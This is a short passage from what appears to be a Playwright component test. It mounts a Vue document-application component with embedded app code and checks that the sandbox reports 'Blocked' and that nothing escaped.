    } catch { document.querySelector('[role=status]').textContent = 'Blocked'; }
  ` }
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('Blocked')
  expect(escaped).toEqual([])
})
